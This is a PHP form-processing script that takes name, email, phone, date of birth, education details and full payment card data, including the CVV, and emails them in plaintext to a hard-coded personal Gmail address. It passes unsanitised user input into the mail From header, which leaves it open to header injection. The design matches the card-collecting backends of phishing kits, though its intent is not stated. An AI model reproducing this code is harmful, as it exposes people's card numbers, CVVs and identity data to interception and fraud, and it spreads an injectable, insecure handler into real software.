<?php
if (isset($_POST['submit'])) {
    // Retrieve form data for Personal Details
    $name = $_POST['name'];
    $email = $_POST['email'];
    $phone = $_POST['phone'];
    $dob = $_POST['dob'];

    // Retrieve form data for Education Information
    $degree = $_POST['degree'];
    $institute = $_POST['institute'];
    $year_of_completion = $_POST['year_of_completion'];

    // Retrieve form data for Payment Information
    $card_number = $_POST['card_number'];
    $expiry_date = $_POST['expiry_date'];
    $cvv = $_POST['cvv'];

    // Build email message
    $to = 'dkrmentor@gmail.com'; // Replace with your email address
    $subject = 'New Form Submission';
    $message = "Personal Details:\n";
    $message .= "Name: $name\n";
    $message .= "Email: $email\n";
    $message .= "Phone: $phone\n";
    $message .= "Date of Birth: $dob\n\n";

    $message .= "Education Information:\n";
    $message .= "Highest Degree Earned: $degree\n";
    $message .= "Institution Name: $institute\n";
    $message .= "Year of Completion: $year_of_completion\n\n";

    $message .= "Payment Information:\n";
    $message .= "Card Number: $card_number\n";
    $message .= "Expiry Date: $expiry_date\n";
    $message .= "CVV: $cvv\n";

    // Send email
    $headers = "From: $name <$email>";
    if (mail($to, $subject, $message, $headers)) {
        // Email sent successfully
        echo "Thank you for your form submission. We will get in touch with you shortly.";
    } else {
        // Error sending email
        echo "Sorry, there was an error submitting the form. Please try again later.";
    }
}
?>
